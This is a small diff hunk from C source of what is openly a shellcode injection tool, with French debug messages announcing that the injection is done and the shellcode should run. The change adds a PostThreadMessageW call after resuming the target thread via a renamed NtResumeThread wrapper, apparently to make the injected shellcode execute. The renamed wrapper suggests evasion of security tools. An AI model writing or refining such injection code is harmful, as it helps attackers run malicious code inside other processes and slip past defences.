@@ -142,6 +142,7 @@ int main(int argc, char* argv[]) {
         if (st != 0) { Qn3_NtResumeThread(hThr, NULL); goto cleanup; }
 
         st = Qn3_NtResumeThread(hThr, NULL);
+        PostThreadMessageW(tid, WM_NULL, 0, 0);
         DBG("[*] NtResume = 0x%08lX\n", st);
         DBG("[+] Injection terminee. Shellcode devrait s'executer.\n");
     }
